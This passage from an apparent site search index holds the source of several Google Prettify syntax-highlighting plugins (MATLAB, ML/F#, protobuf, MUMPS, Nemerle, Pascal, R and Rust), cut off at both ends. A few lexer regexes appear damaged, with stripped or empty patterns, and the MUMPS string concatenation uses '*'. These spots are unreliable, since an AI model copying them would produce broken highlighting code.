'addedvarplot|andrewsplot|anova(?:1|2|n)|ansaribradley|aoctool|barttest|bbdesign|beta(?:cdf|fit|inv|like|pdf|rnd|stat)|bino(?:cdf|fit|inv|pdf|rnd|stat)|biplot|bootci|bootstrp|boxplot|candexch|candgen|canoncorr|capability|capaplot|caseread|casewrite|categorical|ccdesign|cdfplot|chi2(?:cdf|gof|inv|pdf|rnd|stat)|cholcov|Classification(?:BaggedEnsemble|Discriminant(?:\\.(?:fit|make|template))?|Ensemble|KNN(?:\\.(?:fit|template))?|PartitionedEnsemble|PartitionedModel|Tree(?:\\.(?:fit|template))?)|classify|classregtree|cluster|clusterdata|cmdscale|combnk|Compact(?:Classification(?:Discriminant|Ensemble|Tree)|Regression(?:Ensemble|Tree)|TreeBagger)|confusionmat|controlchart|controlrules|cophenet|copula(?:cdf|fit|param|pdf|rnd|stat)|cordexch|corr|corrcov|coxphfit|createns|crosstab|crossval|cvpartition|datasample|dataset|daugment|dcovary|dendrogram|dfittool|disttool|dummyvar|dwtest|ecdf|ecdfhist|ev(?:cdf|fit|inv|like|pdf|rnd|stat)|ExhaustiveSearcher|exp(?:cdf|fit|inv|like|pdf|rnd|stat)|factoran|fcdf|ff2n|finv|fitdist|fitensemble|fpdf|fracfact|fracfactgen|friedman|frnd|fstat|fsurfht|fullfact|gagerr|gam(?:cdf|fit|inv|like|pdf|rnd|stat)|GeneralizedLinearModel(?:\\.fit)?|geo(?:cdf|inv|mean|pdf|rnd|stat)|gev(?:cdf|fit|inv|like|pdf|rnd|stat)|gline|glmfit|glmval|glyphplot|gmdistribution(?:\\.fit)?|gname|gp(?:cdf|fit|inv|like|pdf|rnd|stat)|gplotmatrix|grp2idx|grpstats|gscatter|haltonset|harmmean|hist3|histfit|hmm(?:decode|estimate|generate|train|viterbi)|hougen|hyge(?:cdf|inv|pdf|rnd|stat)|icdf|inconsistent|interactionplot|invpred|iqr|iwishrnd|jackknife|jbtest|johnsrnd|KDTreeSearcher|kmeans|knnsearch|kruskalwallis|ksdensity|kstest|kstest2|kurtosis|lasso|lassoglm|lassoPlot|leverage|lhsdesign|lhsnorm|lillietest|LinearModel(?:\\.fit)?|linhyptest|linkage|logn(?:cdf|fit|inv|like|pdf|rnd|stat)|lsline|mad|mahal|maineffectsplot|manova1|manovacluster|mdscale|mhsample|mle|mlecov|mnpdf|mnrfit|mnrnd|mnrval|moment|multcompare|multivarichart|mvn(?:cdf|pdf|rnd)|mvregress|mvregresslike|mvt(?:cdf|pdf|rnd)|NaiveBayes(?:\\.fit)?|nan(?:cov|max|mean|median|min|std|sum|var)|nbin(?:cdf|fit|inv|pdf|rnd|stat)|ncf(?:cdf|inv|pdf|rnd|stat)|nct(?:cdf|inv|pdf|rnd|stat)|ncx2(?:cdf|inv|pdf|rnd|stat)|NeighborSearcher|nlinfit|nlintool|nlmefit|nlmefitsa|nlparci|nlpredci|nnmf|nominal|NonLinearModel(?:\\.fit)?|norm(?:cdf|fit|inv|like|pdf|rnd|stat)|normplot|normspec|ordinal|outlierMeasure|parallelcoords|paretotails|partialcorr|pcacov|pcares|pdf|pdist|pdist2|pearsrnd|perfcurve|perms|piecewisedistribution|plsregress|poiss(?:cdf|fit|inv|pdf|rnd|tat)|polyconf|polytool|prctile|princomp|ProbDist(?:Kernel|Parametric|UnivKernel|UnivParam)?|probplot|procrustes|qqplot|qrandset|qrandstream|quantile|randg|random|randsample|randtool|range|rangesearch|ranksum|rayl(?:cdf|fit|inv|pdf|rnd|stat)|rcoplot|refcurve|refline|regress|Regression(?:BaggedEnsemble|Ensemble|PartitionedEnsemble|PartitionedModel|Tree(?:\\.(?:fit|template))?)|regstats|relieff|ridge|robustdemo|robustfit|rotatefactors|rowexch|rsmdemo|rstool|runstest|sampsizepwr|scatterhist|sequentialfs|signrank|signtest|silhouette|skewness|slicesample|sobolset|squareform|statget|statset|stepwise|stepwisefit|surfht|tabulate|tblread|tblwrite|tcdf|tdfread|tiedrank|tinv|tpdf|TreeBagger|treedisp|treefit|treeprune|treetest|treeval|trimmean|trnd|tstat|ttest|ttest2|unid(?:cdf|inv|pdf|rnd|stat)|unif(?:cdf|inv|it|pdf|rnd|stat)|vartest(?:2|n)?|wbl(?:cdf|fit|inv|like|pdf|rnd|stat)|wblplot|wishrnd|x2fx|xptread|zscore|ztest' ].join(\"|\"); var imageFunctions = [ 'adapthisteq|analyze75info|analyze75read|applycform|applylut|axes2pix|bestblk|blockproc|bwarea|bwareaopen|bwboundaries|bwconncomp|bwconvhull|bwdist|bwdistgeodesic|bweuler|bwhitmiss|bwlabel|bwlabeln|bwmorph|bwpack|bwperim|bwselect|bwtraceboundary|bwulterode|bwunpack|checkerboard|col2im|colfilt|conndef|convmtx2|corner|cornermetric|corr2|cp2tform|cpcorr|cpselect|cpstruct2pairs|dct2|dctmtx|deconvblind|deconvlucy|deconvreg|deconvwnr|decorrstretch|demosaic|dicom(?:anon|dict|info|lookup|read|uid|write)|edge|edgetaper|entropy|entropyfilt|fan2para|fanbeam|findbounds|fliptform|freqz2|fsamp2|fspecial|ftrans2|fwind1|fwind2|getheight|getimage|getimagemodel|getline|getneighbors|getnhood|getpts|getrangefromclass|getrect|getsequence|gray2ind|graycomatrix|graycoprops|graydist|grayslice|graythresh|hdrread|hdrwrite|histeq|hough|houghlines|houghpeaks|iccfind|iccread|iccroot|iccwrite|idct2|ifanbeam|im2bw|im2col|im2double|im2int16|im2java2d|im2single|im2uint16|im2uint8|imabsdiff|imadd|imadjust|ImageAdapter|imageinfo|imagemodel|imapplymatrix|imattributes|imbothat|imclearborder|imclose|imcolormaptool|imcomplement|imcontour|imcontrast|imcrop|imdilate|imdisplayrange|imdistline|imdivide|imellipse|imerode|imextendedmax|imextendedmin|imfill|imfilter|imfindcircles|imfreehand|imfuse|imgca|imgcf|imgetfile|imhandles|imhist|imhmax|imhmin|imimposemin|imlincomb|imline|immagbox|immovie|immultiply|imnoise|imopen|imoverview|imoverviewpanel|impixel|impixelinfo|impixelinfoval|impixelregion|impixelregionpanel|implay|impoint|impoly|impositionrect|improfile|imputfile|impyramid|imreconstruct|imrect|imregconfig|imregionalmax|imregionalmin|imregister|imresize|imroi|imrotate|imsave|imscrollpanel|imshow|imshowpair|imsubtract|imtool|imtophat|imtransform|imview|ind2gray|ind2rgb|interfileinfo|interfileread|intlut|ippl|iptaddcallback|iptcheckconn|iptcheckhandle|iptcheckinput|iptcheckmap|iptchecknargin|iptcheckstrs|iptdemos|iptgetapi|iptGetPointerBehavior|iptgetpref|ipticondir|iptnum2ordinal|iptPointerManager|iptprefs|iptremovecallback|iptSetPointerBehavior|iptsetpref|iptwindowalign|iradon|isbw|isflat|isgray|isicc|isind|isnitf|isrgb|isrset|lab2double|lab2uint16|lab2uint8|label2rgb|labelmatrix|makecform|makeConstrainToRectFcn|makehdr|makelut|makeresampler|maketform|mat2gray|mean2|medfilt2|montage|nitfinfo|nitfread|nlfilter|normxcorr2|ntsc2rgb|openrset|ordfilt2|otf2psf|padarray|para2fan|phantom|poly2mask|psf2otf|qtdecomp|qtgetblk|qtsetblk|radon|rangefilt|reflect|regionprops|registration\\.metric\\.(?:MattesMutualInformation|MeanSquares)|registration\\.optimizer\\.(?:OnePlusOneEvolutionary|RegularStepGradientDescent)|rgb2gray|rgb2ntsc|rgb2ycbcr|roicolor|roifill|roifilt2|roipoly|rsetwrite|std2|stdfilt|strel|stretchlim|subimage|tformarray|tformfwd|tforminv|tonemap|translate|truesize|uintlut|viscircles|warp|watershed|whitepoint|wiener2|xyz2double|xyz2uint16|ycbcr2rgb' ].join(\"|\"); var optimFunctions = [ 'bintprog|color|fgoalattain|fminbnd|fmincon|fminimax|fminsearch|fminunc|fseminf|fsolve|fzero|fzmult|gangstr|ktrlink|linprog|lsqcurvefit|lsqlin|lsqnonlin|lsqnonneg|optimget|optimset|optimtool|quadprog' ].join(\"|\"); // identifiers: variable/function name, or a chain of variable names joined by dots (obj.method, struct.field1.field2, etc..) // valid variable names (start with letter, and contains letters, digits, and underscores). // we match \"xx.yy\" as a whole so that if \"xx\" is plain and \"yy\" is not, we dont get a false positive for \"yy\" //var reIdent = '(?:[a-zA-Z][a-zA-Z0-9_]*)'; //var reIdentChain = '(?:' + reIdent + '(?:\\.' + reIdent + ')*' + ')'; // patterns that always start with a known character. Must have a shortcut string. var shortcutStylePatterns = [ // whitespaces: space, tab, carriage return, line feed, line tab, form-feed, non-break space [PR.PR_PLAIN, /^[ \\t\\r\\n\\v\\f\\xA0]+/, null, \" \\t\\r\\n\\u000b\\u000c\\u00a0\"], // block comments //TODO: chokes on nested block comments //TODO: false positives when the lines with %{ and %} contain non-spaces //[PR.PR_COMMENT, /^%(?:[^\\{].*|\\{(?:%|%*[^\\}%])*(?:\\}+%?)?)/, null], [PR.PR_COMMENT, /^%\\{[^%]*%+(?:[^\\}%][^%]*%+)*\\}/, null], // single-line comments [PR.PR_COMMENT, /^%[^\\r\\n]*/, null, \"%\"], // system commands [PR_SYSCMD, /^![^\\r\\n]*/, null, \"!\"] ]; // patterns that will be tried in order if the shortcut ones fail. May have shortcuts. var fallthroughStylePatterns = [ // line continuation [PR_LINE_CONTINUATION, /^\\.\\.\\.\\s*[\\r\\n]/, null], // error message [PR_ERROR, /^\\?\\?\\? [^\\r\\n]*/, null], // warning message [PR_WARNING, /^Warning: [^\\r\\n]*/, null], // command prompt/output //[PR_CODE_OUTPUT, /^>>\\s+[^\\r\\n]*[\\r\\n]{1,2}[^=]*=[^\\r\\n]*[\\r\\n]{1,2}[^\\r\\n]*/, null], // full command output (both loose/compact format): `>> EXP\\nVAR =\\n VAL` [PR_CODE_OUTPUT, /^>>\\s+/, null], // only the command prompt `>> ` [PR_CODE_OUTPUT, /^octave:\\d+>\\s+/, null], // Octave command prompt `octave:1> ` // identifier (chain) or closing-parenthesis/brace/bracket, and IS followed by transpose operator // this way we dont misdetect the transpose operator ' as the start of a string [\"lang-matlab-operators\", /^((?:[a-zA-Z][a-zA-Z0-9_]*(?:\\.[a-zA-Z][a-zA-Z0-9_]*)*|\\)|\\]|\\}|\\.)')/, null], // identifier (chain), and NOT followed by transpose operator // this must come AFTER the \"is followed by transpose\" step (otherwise it chops the last char of identifier) [\"lang-matlab-identifiers\", /^([a-zA-Z][a-zA-Z0-9_]*(?:\\.[a-zA-Z][a-zA-Z0-9_]*)*)(?!')/, null], // single-quoted strings: allow for escaping with '', no multilines //[PR.PR_STRING, /(?:(?","link":"/plugins/prettify/lang-matlab.js"},{"title":"","text":"/** * @license * Copyright (C) 2008 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for OCaml, SML, F# and similar languages. * * Based on the lexical grammar at * http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec.html#_Toc270597388 * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace is made up of spaces, tabs and newline characters. [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // #if ident/#else/#endif directives delimit conditional compilation // sections [PR['PR_COMMENT'], /^#(?:if[\\t\\n\\r \\xA0]+(?:[a-z_$][\\w\\']*|``[^\\r\\n\\t`]*(?:``|$))|else|endif|light)/i, null, '#'], // A double or single quoted, possibly multi-line, string. // F# allows escaped newlines in strings. [PR['PR_STRING'], /^(?:\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)|\\'(?:[^\\'\\\\]|\\\\[\\s\\S])(?:\\'|$))/, null, '\"\\''] ], [ // Block comments are delimited by (* and *) and may be // nested. Single-line comments begin with // and extend to // the end of a line. // TODO: (*...*) comments can be nested. This does not handle that. [PR['PR_COMMENT'], /^(?:\\/\\/[^\\r\\n]*|\\(\\*[\\s\\S]*?\\*\\))/], [PR['PR_KEYWORD'], /^(?:abstract|and|as|assert|begin|class|default|delegate|do|done|downcast|downto|elif|else|end|exception|extern|false|finally|for|fun|function|if|in|inherit|inline|interface|internal|lazy|let|match|member|module|mutable|namespace|new|null|of|open|or|override|private|public|rec|return|static|struct|then|to|true|try|type|upcast|use|val|void|when|while|with|yield|asr|land|lor|lsl|lsr|lxor|mod|sig|atomic|break|checked|component|const|constraint|constructor|continue|eager|event|external|fixed|functor|global|include|method|mixin|object|parallel|process|protected|pure|sealed|trait|virtual|volatile)\\b/], // A number is a hex integer literal, a decimal real literal, or in // scientific notation. [PR['PR_LITERAL'], /^[+\\-]?(?:0x[\\da-f]+|(?:(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:e[+\\-]?\\d+)?))/i], [PR['PR_PLAIN'], /^(?:[a-z_][\\w']*[!?#]?|``[^\\r\\n\\t`]*(?:``|$))/i], // A printable non-space non-special character [PR['PR_PUNCTUATION'], /^[^\\t\\n\\r \\xA0\\\"\\'\\w]+/] ]), ['fs', 'ml']);","link":"/plugins/prettify/lang-ml.js"},{"title":"","text":"/** * @license * Copyright (C) 2006 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Protocol Buffers as described at * http://code.google.com/p/protobuf/. * * Based on the lexical grammar at * http://research.microsoft.com/fsharp/manual/spec2.aspx#_Toc202383715 * * @author mikesamuel@gmail.com */ PR['registerLangHandler'](PR['sourceDecorator']({ 'keywords': ( 'bytes,default,double,enum,extend,extensions,false,' + 'group,import,max,message,option,' + 'optional,package,repeated,required,returns,rpc,service,' + 'syntax,to,true'), 'types': /^(bool|(double|s?fixed|[su]?int)(32|64)|float|string)\\b/, 'cStyleComments': true }), ['proto']);","link":"/plugins/prettify/lang-proto.js"},{"title":"","text":"/** * @license * Copyright (C) 2011 Kitware Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for MUMPS. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my SQL code) * * Commands, intrinsic functions and variables taken from ISO/IEC 11756:1999(E) * * @author chris.harris@kitware.com * * Known issues: * * - Currently can't distinguish between keywords and local or global variables having the same name * for exampe SET IF=\"IF?\" * - m file are already used for MatLab hence using mumps. */ (function () { var commands = 'B|BREAK|' + 'C|CLOSE|' + 'D|DO|' + 'E|ELSE|' + 'F|FOR|' + 'G|GOTO|' + 'H|HALT|' + 'H|HANG|' + 'I|IF|' + 'J|JOB|' + 'K|KILL|' + 'L|LOCK|' + 'M|MERGE|' + 'N|NEW|' + 'O|OPEN|' + 'Q|QUIT|' + 'R|READ|' + 'S|SET|' + 'TC|TCOMMIT|' + 'TRE|TRESTART|' + 'TRO|TROLLBACK|' + 'TS|TSTART|' + 'U|USE|' + 'V|VIEW|' + 'W|WRITE|' + 'X|XECUTE'; var intrinsicVariables = 'D|DEVICE|' + 'EC|ECODE|' + 'ES|ESTACK|' + 'ET|ETRAP|' + 'H|HOROLOG|' + 'I|IO|' + 'J|JOB|' + 'K|KEY|' + 'P|PRINCIPAL|' + 'Q|QUIT|' + 'ST|STACK|' + 'S|STORAGE|' + 'SY|SYSTEM|' + 'T|TEST|' + 'TL|TLEVEL|' + 'TR|TRESTART|' + 'X|' + 'Y|' + 'Z[A-Z]*|'; var intrinsicFunctions = 'A|ASCII|' + 'C|CHAR|' + 'D|DATA|' + 'E|EXTRACT|' + 'F|FIND|' + 'FN|FNUMBER|' + 'G|GET|' + 'J|JUSTIFY|' + 'L|LENGTH|' + 'NA|NAME|' + 'O|ORDER|' + 'P|PIECE|' + 'QL|QLENGTH|' + 'QS|QSUBSCRIPT|' + 'Q|QUERY|' + 'R|RANDOM|' + 'RE|REVERSE|' + 'S|SELECT|' + 'ST|STACK|' + 'T|TEXT|' + 'TR|TRANSLATE|' + 'V|VIEW|' * 'Z[A-Z]*|'; var intrinsic = intrinsicVariables + intrinsicFunctions; var shortcutStylePatterns = [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double or single quoted, possibly multi-line, string. [PR['PR_STRING'], /^(?:\"(?:[^\"]|\\\\.)*\")/, null, '\"'] ]; var fallthroughStylePatterns = [ // A line comment that starts with ; [PR['PR_COMMENT'], /^;[^\\r\\n]*/, null, ';'], // Add intrinsic variables and functions as declarations, there not really but it mean // they will hilighted differently from commands. [PR['PR_DECLARATION'], new RegExp('^(?:\\\\$(?:' + intrinsic + '))\\\\b', 'i'), null], // Add commands as keywords [PR['PR_KEYWORD'], new RegExp('^(?:[^\\\\$]' + commands + ')\\\\b', 'i'), null], // A number is a decimal real literal or in scientific notation. [PR['PR_LITERAL'], /^[+-]?(?:(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:E[+\\-]?\\d+)?)/i], // An identifier [PR['PR_PLAIN'], /^[a-z][a-zA-Z0-9]*/i], // Exclude $ % and ^ [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r\\xA0\\\"\\$;%\\^]|_/] ]; // Can't use m as its already used for MatLab PR.registerLangHandler(PR.createSimpleLexer(shortcutStylePatterns, fallthroughStylePatterns), ['mumps']); })();","link":"/plugins/prettify/lang-mumps.js"},{"title":"","text":"/** * @license * Copyright (C) 2011 Zimin A.V. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for the Nemerle language. * http://nemerle.org * @author Zimin A.V. */ (function () { // http://nemerle.org/wiki/index.php?title=Base_keywords var keywords = 'abstract|and|as|base|catch|class|def|delegate|enum|event|extern|false|finally|' + 'fun|implements|interface|internal|is|macro|match|matches|module|mutable|namespace|new|' + 'null|out|override|params|partial|private|protected|public|ref|sealed|static|struct|' + 'syntax|this|throw|true|try|type|typeof|using|variant|virtual|volatile|when|where|with|' + 'assert|assert2|async|break|checked|continue|do|else|ensures|for|foreach|if|late|lock|new|nolate|' + 'otherwise|regexp|repeat|requires|return|surroundwith|unchecked|unless|using|while|yield'; PR['registerLangHandler'](PR['createSimpleLexer']( // shortcutStylePatterns [ [PR['PR_STRING'], /^(?:\\'(?:[^\\\\\\'\\r\\n]|\\\\.)*\\'|\\\"(?:[^\\\\\\\"\\r\\n]|\\\\.)*(?:\\\"|$))/, null, '\"'], [PR['PR_COMMENT'], /^#(?:(?:define|elif|else|endif|error|ifdef|include|ifndef|line|pragma|undef|warning)\\b|[^\\r\\n]*)/, null, '#'], [PR['PR_PLAIN'], /^\\s+/, null, ' \\r\\n\\t\\xA0'] ], // fallthroughStylePatterns [ [PR['PR_STRING'], /^@\\\"(?:[^\\\"]|\\\"\\\")*(?:\\\"|$)/, null], [PR['PR_STRING'], /^])*(?:#>|$)/, null], [PR['PR_STRING'], /^/, null], [PR['PR_COMMENT'], /^\\/\\/[^\\r\\n]*/, null], [PR['PR_COMMENT'], /^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/, null], [PR['PR_KEYWORD'], new RegExp('^(?:' + keywords + ')\\\\b'), null], [PR['PR_TYPE'], /^(?:array|bool|byte|char|decimal|double|float|int|list|long|object|sbyte|short|string|ulong|uint|ufloat|ulong|ushort|void)\\b/, null], [PR['PR_LITERAL'], /^@[a-z_$][a-z_$@0-9]*/i, null], [PR['PR_TYPE'], /^@[A-Z]+[a-z][A-Za-z_$@0-9]*/, null], [PR['PR_PLAIN'], /^'?[A-Za-z_$][a-z_$@0-9]*/i, null], [PR['PR_LITERAL'], new RegExp( '^(?:' // A hex number + '0x[a-f0-9]+' // or an octal or decimal number, + '|(?:\\\\d(?:_\\\\d+)*\\\\d*(?:\\\\.\\\\d*)?|\\\\.\\\\d\\\\+)' // possibly in scientific notation + '(?:e[+\\\\-]?\\\\d+)?' + ')' // with an optional modifier like UL for unsigned long + '[a-z]*', 'i'), null, '0123456789'], [PR['PR_PUNCTUATION'], /^.[^\\s\\w\\.$@\\'\\\"\\`\\/\\#]*/, null] ]), ['n', 'nemerle']); })();","link":"/plugins/prettify/lang-n.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Peter Kofler * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ // Contributed by peter dot kofler at code minus cop dot org /** * @fileoverview * Registers a language handler for (Turbo) Pascal. * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my Pascal code) * * @author peter dot kofler at code minus cop dot org */ PR.registerLangHandler( PR.createSimpleLexer( [ // shortcutStylePatterns // 'single-line-string' [PR.PR_STRING, /^(?:\\'(?:[^\\\\\\'\\r\\n]|\\\\.)*(?:\\'|$))/, null, '\\''], // Whitespace [PR.PR_PLAIN, /^\\s+/, null, ' \\r\\n\\t\\xA0'] ], [ // fallthroughStylePatterns // A cStyleComments comment (* *) or {} [PR.PR_COMMENT, /^\\(\\*[\\s\\S]*?(?:\\*\\)|$)|^\\{[\\s\\S]*?(?:\\}|$)/, null], [PR.PR_KEYWORD, /^(?:ABSOLUTE|AND|ARRAY|ASM|ASSEMBLER|BEGIN|CASE|CONST|CONSTRUCTOR|DESTRUCTOR|DIV|DO|DOWNTO|ELSE|END|EXTERNAL|FOR|FORWARD|FUNCTION|GOTO|IF|IMPLEMENTATION|IN|INLINE|INTERFACE|INTERRUPT|LABEL|MOD|NOT|OBJECT|OF|OR|PACKED|PROCEDURE|PROGRAM|RECORD|REPEAT|SET|SHL|SHR|THEN|TO|TYPE|UNIT|UNTIL|USES|VAR|VIRTUAL|WHILE|WITH|XOR)\\b/i, null], [PR.PR_LITERAL, /^(?:true|false|self|nil)/i, null], [PR.PR_PLAIN, /^[a-z][a-z0-9]*/i, null], // Literals .0, 0, 0.0 0E13 [PR.PR_LITERAL, /^(?:\\$[a-f0-9]+|(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:e[+\\-]?\\d+)?)/i, null, '0123456789'], [PR.PR_PUNCTUATION, /^.[^\\s\\w\\.$@\\'\\/]*/, null] ]), ['pascal']);","link":"/plugins/prettify/lang-pascal.js"},{"title":"","text":"/** * @license * Copyright (C) 2012 Jeffrey B. Arnold * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for S, S-plus, and R source code. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * code * * Language definition from * http://cran.r-project.org/doc/manuals/R-lang.html. * Many of the regexes are shared with the pygments SLexer, * http://pygments.org/. * * Original: https://raw.github.com/jrnold/prettify-lang-r-bugs/master/lang-r.js * * @author jeffrey.arnold@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'], [PR['PR_STRING'], /^\\'(?:[^\\'\\\\]|\\\\[\\s\\S])*(?:\\'|$)/, null, \"'\"] ], [ [PR['PR_COMMENT'], /^#.*/], [PR['PR_KEYWORD'], /^(?:if|else|for|while|repeat|in|next|break|return|switch|function)(?![A-Za-z0-9_.])/], // hex numbes [PR['PR_LITERAL'], /^0[xX][a-fA-F0-9]+([pP][0-9]+)?[Li]?/], // Decimal numbers [PR['PR_LITERAL'], /^[+-]?([0-9]+(\\.[0-9]+)?|\\.[0-9]+)([eE][+-]?[0-9]+)?[Li]?/], // builtin symbols [PR['PR_LITERAL'], /^(?:NULL|NA(?:_(?:integer|real|complex|character)_)?|Inf|TRUE|FALSE|NaN|\\.\\.(?:\\.|[0-9]+))(?![A-Za-z0-9_.])/], // assignment, operators, and parens, etc. [PR['PR_PUNCTUATION'], /^(?:?|-|==|=||&&?|!=|\\|\\|?|\\*|\\+|\\^|\\/|!|%.*?%|=|~|\\$|@|:{1,3}|[\\[\\](){};,?])/], // valid variable names [PR['PR_PLAIN'], /^(?:[A-Za-z]+[A-Za-z0-9_.]*|\\.[a-zA-Z_][0-9a-zA-Z\\._]*)(?![A-Za-z0-9_.])/], // string backtick [PR['PR_STRING'], /^`.+`/] ]), ['r', 's', 'R', 'S', 'Splus']);","link":"/plugins/prettify/lang-r.js"},{"title":"","text":"/** * @license * Copyright (C) 2015 Chris Morgan * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Rust. * * Derived from prior experience implementing similar things in a few environments, * most especially rust.vim. * * @author me@chrismorgan.info */ PR['registerLangHandler']( PR['createSimpleLexer']([], [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/], // Single line comments [PR['PR_COMMENT'], /^\\/\\/.*/], // Block comments (sadly I do not see how to make this cope with comment nesting as it should) [PR['PR_COMMENT'], /^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/],//, null], // String and character literals [PR['PR_STRING'], /^b\"(?:[^\\\\]|\\\\(?:.|x[\\da-fA-F]{2}))*?\"/], // Bytes literal [PR['PR_STRING'], /^\"(?:[^\\\\]|\\\\(?:.|x[\\da-fA-F]{2}|u\\{\\[\\da-fA-F]{1,6}\\}))*?\"/], // String literal [PR['PR_STRING'], /^b?r(#*)\\\"[\\s\\S]*?\\\"\\1/], // Raw string/bytes literal [PR['PR_STRING'], /^b'([^\\\\]|\\\\(.|x[\\da-fA-F]{2}))'/], // Byte literal [PR['PR_STRING'], /^'([^\\\\]|\\\\(.|x[\\da-fA-F]{2}|u\\{[\\da-fA-F]{1,6}\\}))'/], // Character literal // Lifetime [PR['PR_TAG'], /^'\\w+?\\b/], // Keywords, reserved keywords and primitive types [PR['PR_KEYWORD'], /^(?:match|if|else|as|break|box|continue|extern|fn|for|in|if|impl|let|loop|pub|return|super|unsafe|where|while|use|mod|trait|struct|enum|type|move|mut|ref|static|const|crate)\\b/], [PR['PR_KEYWORD'], /^(?:alignof|become|do|offsetof|priv|pure|sizeof|typeof|unsized|yield|abstract|virtual|final|override|macro)\\b/], [PR['PR_TYPE'], /^(?:[iu](8|16|32|64|128|size)|char|bool|f32|f64|str|Self)\\b/], // Rust 1.0 prelude items [PR['PR_TYPE'], /^(?:Copy|Send|Sized|Sync|Drop|Fn|FnMut|FnOnce|Box|ToOwned|Clone|PartialEq|PartialOrd|Eq|Ord|AsRef|AsMut|Into|From|Default|Iterator|Extend|IntoIterator|DoubleEndedIterator|ExactSizeIterator|Option|Some|None|Result|Ok|Err|SliceConcatExt|String|ToString|Vec)\\b/], // Literals: [PR['PR_LITERAL'], /^(self|true|false|null)\\b/], // A number is a hex integer literal, a decimal real literal, or in // scientific notation. // Integer literals: decimal, hexadecimal, octal, binary. [PR['PR_LITERAL'], /^\\d[0-9_]*(?:[iu](?:size|8|16|32|64|128))?/], [PR['PR_LITERAL'], /^0x[a-fA-F0-9_]+(?:[iu](?:size|8|16|32|64|128))?/], [PR['PR_LITERAL'], /^0o[0-7_]+(?:[iu](?:size|8|16|32|64|128))?/], [PR['PR_LITERAL'], /^0b[01_]+(?:[iu](?:size|8|16|32|64|128))?/], // Float literals [PR['PR_LITERAL'], /^\\d[0-9_]*\\.(?![^\\s\\d.])/], [PR['PR_LITERAL'], /^\\d[0-9_]*(?:\\.\\d[0-9_]*)(?:[eE][+-]?[0-9_]+)?(?:f32|f64)?/], [PR['PR_LITERAL'], /^\\d[0-9_]*(?:\\.\\d[0-9_]*)?(?:[eE][+-]?[0-9_]+)(?:f32|f64)?/], [PR['PR_LITERAL'], /^\\d[0-9_]*(?:\\.\\d[0-9_]*)?(?:[eE][+-]?[0-9_]+)?(?:f32|f64)/], // Macro invocations (an identifier plus a !) [PR['PR_ATTRIB_NAME'], /^[a-z_]\\w*!/i], // An identifier (sorry, this should be 